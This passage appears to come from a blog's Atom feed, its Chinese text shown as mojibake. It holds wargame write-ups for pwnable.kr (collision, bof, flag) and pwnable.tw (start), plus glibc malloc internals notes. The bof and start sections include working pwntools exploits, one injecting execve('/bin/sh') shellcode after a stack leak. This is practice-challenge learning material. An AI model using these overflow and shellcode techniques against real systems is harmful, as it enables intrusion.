å‡½æ•°æ¥æ£€æµ‹ï¼‰ï¼Œç›´åˆ°é‡ä¸Šæ•°å­—æˆ–æ­£è´Ÿç¬¦å·æ‰å¼€å§‹åšè½¬æ¢ï¼Œè€Œå†é‡åˆ°éæ•°å­—æˆ–å­—ç¬¦ä¸²ç»“æŸæ—¶(â€˜\0â€™)æ‰ç»“æŸè½¬æ¢ï¼Œå¹¶å°†ç»“æœè¿”å›ï¼Œè¿”å›è½¬æ¢åçš„æ•´å‹æ•°ï¼›å¦‚æœ str ä¸èƒ½è½¬æ¢æˆ int æˆ–è€… str ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå°†è¿”å› 0ã€‚</li></ul><hr><h1 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h1><p>è¿ä¸Šåä¸‰ä¸ªæ–‡ä»¶,æ–‡ä»¶æ ·å¼å’Œæƒé™å’Œä¸Šä¸€é¢˜ä¸€æ ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;</span><br><span class="line"><span class="type">int</span>* ip = (<span class="type">int</span>*)p;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">res += ip[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cè¯­è¨€åŸºç¡€ä¸ç‰¢,char* a[]çŸ¥é“æ˜¯ç”±å­—ç¬¦æŒ‡é’ˆç»„æˆçš„æ•°ç»„,ä½†ä¸€æ—¶ç«Ÿä¸çŸ¥é“æ¯ä¸€ä¸ªæˆå‘˜è¿˜å¯ä»¥ä»£è¡¨æŒ‡å‘ä¸€ä¸ªå­—ç¬¦ä¸²ğŸ¤”</p><p>è¾“å…¥è¦ä¸º20ä¸ªå­—èŠ‚(å­—ç¬¦),ä»¥16è¿›åˆ¶å­˜å‚¨,è¿›å…¥checkå‡½æ•°,ä¼šè¢«å¼ºåˆ¶è½¬ä¸ºint*æŒ‡é’ˆ,å³è¾“å…¥çš„20ä¸ªå­—ç¬¦è¢«è§†ä¸ºäº†5ä¸ªintæ•°</p><p>ç°åœ¨å°±æ˜¯è¦æƒ³åŠæ³•æ„é€ å‡ºhashcodeäº†,è¿™é‡Œæ„é€ å››å¤„æŸ¥äº†ä¸€äº›èµ„æ–™,æœ‰ä¸¤ç§åŠæ³•</p><ol><li>å…¨éƒ¨ç”¨å¯æ‰“å°å­—ç¬¦è¡¨ç¤º,å¥½å¤„æ˜¯ç›´è§‚,ä½†è¦è®¡ç®—æœ‰ç‚¹éº»çƒ¦</li><li>æ— è®ºæ˜¯å¦å¯è§ç”¨åå…­è¿›åˆ¶asciiç è¡¨ç¤º,å¥½å¤„æ˜¯åŸºæœ¬æ²¡æœ‰è®¡ç®—é‡,ä½†ç›´æ¥è¾“å…¥åå…­è¿›åˆ¶æ•°æ®ä¾ç„¶ä¼šè¢«è§†ä½œå­—ç¬¦,æ‰€ä»¥éœ€è¦ç”¨åˆ°python</li></ol><p>æˆ‘é€‰æ‹©ç”¨ç¬¬äºŒç§æ–¹æ³•(å› ä¸ºç¬¬ä¸€ç§è¦æ§åˆ¶å¯æ‰“å°å­—ç¬¦å¤§éº»çƒ¦äº†ğŸ˜¢)</p><p>é”®å…¥(åˆ«å¿˜äº†å°ç«¯åº)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./col $(python -c <span class="string">&#x27;print &quot;\x01&quot;*16+&quot;\xe8\x05\xd9\x1d&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å‰é¢çš„16å­—èŠ‚æˆ‘ä¸€å¼€å§‹è¿˜æ‰“ç®—ç”¨\x00å¡«å……,è¿˜æƒ³æ€ä¹ˆè€æ˜¯æç¤ºé•¿åº¦ä¸å¤Ÿ,ç»“æœå¿˜äº†strlen()æµ‹é‡é•¿åº¦åˆ°\x00ç»“æŸğŸ™‚</p><h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p>æ˜¯ç†Ÿæ‚‰çš„å‘³é“ğŸ˜­</p><p>æ£€æŸ¥ä¿æŠ¤</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-21_163931.png" alt=""></p><p>idaçœ‹ä¸€çœ‹</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-21_163837.png" alt=""></p><p>a1æ˜¯è¿™ä¸ªå‡½æ•°çš„å‚æ•°,ä¹Ÿå°±æ˜¯åœ¨è¿”å›åœ°å€ä¸Šä¸€ä¸ª</p><p>ä½¿a1çš„å€¼ä¸º-889275714,æˆ‘è¿˜å‚»ä¹ä¹çš„æ‰“ç®—å»ç”¨è¡¥ç æ¢ç®—æˆåå…­è¿›åˆ¶,ç»“æœå‘ç°æ±‡ç¼–ä»£ç ä¸­å°±æœ‰ç›´æ¥çš„åå…­è¿›åˆ¶æ•°æ®0CAFEBABEh</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span>+<span class="string">b&#x27;\xbe\xba\xfe\xca&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>ç»™äº†ä¸€ä¸ªflagæ–‡ä»¶ï¼Œidaæ‰“å¼€æç¤ºupxåŠ å£³ï¼Œè„±å£³åflagä»¥æ˜æ–‡å½¢å¼å­˜åœ¨</p>]]></content>
    
    
    <summary type="html">æ¯”twç®€å•ä¸€ç‚¹</summary>
    
    
    
    <category term="é¢˜è§£" scheme="https://ixout.github.io/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="wp" scheme="https://ixout.github.io/tags/wp/"/>
    
    <category term="pwnable.kr" scheme="https://ixout.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.twåˆ·é¢˜è®°å½•-1</title>
    <link href="https://ixout.github.io/posts/10836/"/>
    <id>https://ixout.github.io/posts/10836/</id>
    <published>2023-03-20T01:01:55.000Z</published>
    <updated>2023-03-27T06:13:59.446Z</updated>
    
    <content type="html"><![CDATA[<h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>ç¬¬ä¸€æ­¥æ£€æŸ¥ä¿æŠ¤,æ˜¯ä¹…è¿çš„æ„Ÿè§‰ğŸ˜‚</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-20_082554.png" alt=""></p><hr><p>idaæ‰“å¼€çœ‹çœ‹</p><p>ä¸éš¾å‘ç°å…¶ä¸æ˜¯æ ‡å‡†æ ˆå¸§ç»“æ„,ğŸ”’ä»¥idaåæ±‡ç¼–ä¸äº†(ç™¾åº¦å¯ä»¥æœç´¢è§£å†³åŠæ³•),å¥½åœ¨ä¸é•¿ç›´æ¥çœ‹æ±‡ç¼–ä»£ç å§.</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-20_091524.png" alt=""></p><p>ç¨‹åºä¸»ä½“æ˜¯ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨readå’Œwrite,å…¶ä¸­readè¯»å–60ä¸ªå­—èŠ‚æ˜æ˜¾æœ‰æº¢å‡º,ä½†è¦æ€ä¹ˆåˆ©ç”¨æ˜¯å…³é”®</p><p>é¦–é€‰è‡ªç„¶æ˜¯ret2shellcodeäº†,ä½†ret2shellcodeéœ€è¦æ ˆåœ°å€,å¯ä»¥çœ‹åˆ°ç¨‹åºèµ·å§‹æœ‰å‘æ ˆä¸­å‹å…¥esp,æˆ‘ä»¬å¯ä»¥é€‰æ‹©å€Ÿç”¨writeç³»ç»Ÿè°ƒç”¨å°†å…¶æ³„éœ²,å‰©ä¸‹çš„å°±æ˜¯å¸¸è§„æ“ä½œäº†</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(<span class="number">0x8048087</span>))</span><br><span class="line">stack=u32(p.recv(<span class="number">4</span>))+<span class="number">0x14</span> <span class="comment">#åŠ 14æ˜¯å› ä¸ºæœ€ååˆæŠ¬é«˜äº†espä¸€æ¬¡</span></span><br><span class="line">p.recv()</span><br><span class="line">sh=<span class="string">b&quot;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(stack)+sh)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-201.png" alt=""></p><h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1>]]></content>
    
    
    <summary type="html">è¿™å°±æ˜¯åœ¨éš¾ä¸ºæˆ‘äº†</summary>
    
    
    
    <category term="é¢˜è§£" scheme="https://ixout.github.io/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="pwnable.tw" scheme="https://ixout.github.io/tags/pwnable-tw/"/>
    
    <category term="wp" scheme="https://ixout.github.io/tags/wp/"/>
    
    <category term="åˆ·é¢˜è®°å½•" scheme="https://ixout.github.io/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>å †å­¦ä¹ ç¬”è®°-2</title>
    <link href="https://ixout.github.io/posts/40023/"/>
    <id>https://ixout.github.io/posts/40023/</id>
    <published>2023-03-18T08:17:28.000Z</published>
    <updated>2023-03-20T06:35:39.234Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç¬¬ä¸€ç¯‡å †å­¦ä¹ ç¬”è®°ä¸»è¦è¿˜æ˜¯åŸºç¡€æ€§çš„çŸ¥è¯†è¦å¤šä¸€ç‚¹ï¼Œåƒmallocå’Œfreeçš„æµç¨‹éƒ½åªæ˜¯è´´äº†å¼ å›¾ï¼Œè¿™ç¯‡æ–‡ç« åˆ™ç¨å¾®æ›´æ·±å…¥ä¸€ç‚¹ç‚¹ã€‚</p><h1 id="æ— tcache"><a href="#æ— tcache" class="headerlink" title="æ— tcache"></a>æ— tcache</h1><h2 id="mallocåˆå§‹åŒ–"><a href="#mallocåˆå§‹åŒ–" class="headerlink" title="mallocåˆå§‹åŒ–"></a>mallocåˆå§‹åŒ–</h2><p>mallocçš„å…¥å£æ˜¯æ˜¯_libc_malloc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* __libc_malloc (<span class="type">size_t</span> bytes) &#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line">  <span class="comment">// First part: callback</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">  <span class="comment">// Second part  </span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">// Third part</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ä»£ç å¯ä»¥çœ‹å‡ºï¼Œä¸»è¦åŒ…å«<strong>callbackã€arena_getã€_int_malloc</strong>è¿™å‡ æ­¥ï¼Œæˆ‘ä»¬æŠŠ<strong>callbackå’Œarena_getå½“ä½œåˆå§‹åŒ–</strong>çš„è¿‡ç¨‹ï¼Œ_<strong>int_mallocä½œä¸ºå®é™…åˆ†é…</strong>çš„è¿‡ç¨‹ï¼Œæœ¬æ–‡ç€é‡æ¥çœ‹åˆå§‹åŒ–çš„è¿‡ç¨‹ï¼Œä¸‹ç¯‡æ–‡ç« å†çœ‹_int_mallocã€‚</p><p>å†é¢å¤–è¯´ä¸€ä¸‹builtin_expectï¼Œå®ƒæ˜¯gccçš„æ‰©å±•ï¼Œç”¨æ¥å…è®¸ç¨‹åºå‘˜å°†æœ€æœ‰å¯èƒ½æ‰§è¡Œçš„åˆ†æ”¯å‘Šè¯‰ç¼–è¯‘å™¨ï¼Œè¿™æ ·ç¼–è¯‘å™¨å°±å¯ä»¥å¯¹åˆ†æ”¯é¢„æµ‹åšä¸€äº›ä¼˜åŒ–ï¼Œç®€å•æ¥è®²å°±æ˜¯åœ¨é‡åˆ°åˆ†æ”¯çš„æ—¶å€™ï¼Œå…ˆç”Ÿæˆå¤§æ¦‚ç‡åˆ†æ”¯çš„æŒ‡ä»¤ï¼Œè¿™æ ·æŒ‡ä»¤cacheçš„å‘½ä¸­ç‡ä¼šå˜é«˜ï¼Œå…·ä½“ç»†èŠ‚å¯ä»¥å‚è€ƒgccçš„å®˜æ–¹æ–‡æ¡£ï¼ˆä»¥GCC10.1ä¸ºä¾‹ï¼š<a href="https://gcc.gnu.org/onlinedocs/gcc-10.1.0/gcc/Other-Builtins.html#Other-Builtinsï¼‰ï¼Œæœ‰æ—¶ä¹Ÿä¼šå°†__builtin_expectæŒ‡ä»¤å°è£…ä¸ºlikelyå’Œunlikelyå®ï¼Œå®ƒä»¬çš„å®šä¹‰å¦‚ä¸‹æ‰€ç¤ºï¼š">https://gcc.gnu.org/onlinedocs/gcc-10.1.0/gcc/Other-Builtins.html#Other-Builtinsï¼‰ï¼Œæœ‰æ—¶ä¹Ÿä¼šå°†__builtin_expectæŒ‡ä»¤å°è£…ä¸ºlikelyå’Œunlikelyå®ï¼Œå®ƒä»¬çš„å®šä¹‰å¦‚ä¸‹æ‰€ç¤ºï¼š</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __builtin_expect(expr, val) (expr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> likely(expr) __builtin_expect(!!(expr), 1) <span class="comment">//exprå¾ˆå¯èƒ½ä¸ºçœŸ</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlikely(expr) __builtin_expect(!!(expr), 0) <span class="comment">//exprå¾ˆå¯èƒ½ä¸ºå‡</span></span></span><br></pre></td></tr></table></figure><h3 id="callback"><a href="#callback" class="headerlink" title="callback"></a>callback</h3><p>å…ˆçœ‹å‰é¢ä»£ç 1ä¸­çš„first partï¼Œå¦‚ä¸‹ä¸¤å¥ï¼Œç¬¬ä¸€å¥æ˜¯ç»™å‡½æ•°æŒ‡é’ˆå˜é‡èµ‹å€¼ï¼Œç¬¬äºŒå¥æ˜¯å‡½æ•°è°ƒç”¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>hookæ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆå˜é‡ï¼Œè¢«èµ‹å€¼æˆäº†__malloc_hookï¼Œåè€…å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__malloc_hook)</span></span><br><span class="line">  <span class="params">(<span class="type">size_t</span> __size, <span class="type">const</span> <span class="type">void</span> *)</span> = malloc_hook_ini;</span><br></pre></td></tr></table></figure><p>__malloc_hookè¢«åˆå§‹åŒ–æˆäº†malloc_hook_iniï¼Œåè€…å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">malloc_hook_ini</span> <span class="params">(<span class="type">size_t</span> sz, <span class="type">const</span> <span class="type">void</span> *caller)</span> &#123;</span><br><span class="line">  __malloc_hook = <span class="literal">NULL</span>;</span><br><span class="line">  ptmalloc_init ();</span><br><span class="line">  <span class="keyword">return</span> __libc_malloc (sz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<strong>malloc_hookåˆè¢«èµ‹å€¼æˆäº†NULLï¼Œç„¶åå†é‡æ–°è°ƒç”¨</strong>libc_mallocï¼Œè¿™æ ·å°±å¯ä»¥ä¿è¯åœ¨å¤šæ¬¡è°ƒç”¨__libc_mallocçš„æƒ…å†µä¸‹ï¼Œä»£ç 1ä¸­çš„hookå›è°ƒå‡½æ•°åªä¼šè¢«è°ƒç”¨ä¸€æ¬¡ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_170117.png" alt=""></p><p>è¿™ä¸ªå‡½æ•°é‡Œçš„ptmalloc_initçš„ç²¾ç®€å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ptmalloc_init</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  __malloc_initialized = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  thread_arena = &amp;main_arena;</span><br><span class="line">  malloc_init_state (&amp;main_arena);</span><br><span class="line">  </span><br><span class="line">  __malloc_initialized = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°é€šè¿‡__malloc_initializedè¿™ä¸ªå…¨å±€flagæ¥æ£€æµ‹æ˜¯ä¸æ˜¯å·²ç»åˆå§‹åŒ–è¿‡äº†ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™æŠŠmain_arenaè®¾æˆå½“å‰çš„thread_arenaï¼Œè¿™æ˜¯å› ä¸ºåˆå§‹åŒ–è‚¯å®šæ˜¯ä¸»çº¿ç¨‹åœ¨åšï¼Œè€Œä¸»çº¿ç¨‹ç”¨çš„æ˜¯main_arenaï¼Œç„¶åå†è°ƒç”¨malloc_init_stateè¿›ä¸€æ­¥åˆå§‹åŒ–ï¼Œmalloc_init_stateå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">malloc_init_state</span> <span class="params">(mstate av)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  mbinptr bin;</span><br><span class="line">  <span class="comment">// part1</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i) &#123;</span><br><span class="line">      bin = bin_at (av, i);</span><br><span class="line">      bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// part2</span></span><br><span class="line">  <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">    set_max_fast(DEFAULT_MXFAST);</span><br><span class="line">  av-&gt;top = initial_top (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc_init_stateçš„part1æŠŠmalloc_stateä¸­çš„bins arrayåˆå§‹åŒ–æˆäº†ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_170451.png" alt=""></p><p>malloc_init_stateçš„part2æŠŠmalloc_stateä¸­çš„topåˆå§‹åŒ–æˆäº†æŒ‡å‘ä¸Šå›¾2ä¸­çš„bin1ï¼Œä¿®æ”¹topåå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_170512.png" alt=""></p><h3 id="arena-get"><a href="#arena-get" class="headerlink" title="arena_get"></a>arena_get</h3><p>ä»‹ç©æ„æ˜¯ä¸ªå®,æºä»£ç é‡Œæœ‰ä¸€æ®µè§£é‡Š:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* arena_get() acquires an arena and locks the corresponding mutex.</span></span><br><span class="line"><span class="comment">   First, try the one last locked successfully by this thread.  (This</span></span><br><span class="line"><span class="comment">   is the common case and handled with a macro for speed.)  Then, loop</span></span><br><span class="line"><span class="comment">   once over the circularly linked list of arenas.  If no arena is</span></span><br><span class="line"><span class="comment">   readily available, create a new one.  In this latter case, `size&#x27;</span></span><br><span class="line"><span class="comment">   is just a hint as to how much memory will be required immediately</span></span><br><span class="line"><span class="comment">   in the new arena. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line"><span class="meta">      ptr = thread_arena;      \</span></span><br><span class="line"><span class="meta">      arena_lock (ptr, size);      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_lock(ptr, size) do &#123;      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (ptr)      \</span></span><br><span class="line"><span class="meta">        __libc_lock_lock (ptr-&gt;mutex);      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">else</span>      \</span></span><br><span class="line"><span class="meta">        ptr = arena_get2 ((size), NULL);      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>arena_getå¯ä»¥ç²¾ç®€æˆå¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size) do &#123;                \</span></span><br><span class="line"><span class="meta">  ptr = thread_arena;                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (ptr) &#123; __libc_lock_lock (ptr-&gt;mutex); &#125;  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123; ptr = arena_get2 ((size), NULL); &#125;    \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>å¯è§ä¸»è¦çš„å®ç°åœ¨arena_get2è¿™ä¸ªå‡½æ•°é‡Œï¼Œå®ƒçš„ä¸»è¦ä½œç”¨æ˜¯ä¸ºå½“å‰çº¿ç¨‹è·å–ä¸€ä¸ªå¯ç”¨çš„arenaï¼Œè¿™ä¸ªå‡½æ•°çš„å®ç°å¾ˆå¤æ‚ï¼Œè€ƒè™‘äº†å„ç§æƒ…å†µï¼Œå‡½æ•°é‡ŒåˆåµŒå¥—è°ƒç”¨äº†å¤šä¸ªå‡½æ•°ï¼Œæˆ‘æŠŠå…³é”®çš„æµç¨‹æ€»ç»“åœ¨ä¸‹å›¾é‡Œï¼š</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_171208.png" alt=""></p><p>ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œarena_get2çš„flowé‡Œä¸»è¦è°ƒç”¨äº†get_free_listã€reused_arenaã€_int_new_arenaè¿™ä¸‰ä¸ªå‡½æ•°ï¼Œè¿™é‡Œä¸è¯¦ç»†è®²è§£æ¯ä¸€ä¸ªå‡½æ•°äº†ï¼Œå®ƒä»¬çš„ä½œç”¨ä»å‡½æ•°åå°±å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™ä¸‰ä¸ªå‡½æ•°é‡Œé¢_int_new_arenaæ›´é‡è¦ä¸€äº›ï¼Œåé¢ç€é‡è®²ä¸€ä¸‹è¿™ä¸€ä¸ªå‡½æ•°ã€‚</p><h3 id="int-new-arena"><a href="#int-new-arena" class="headerlink" 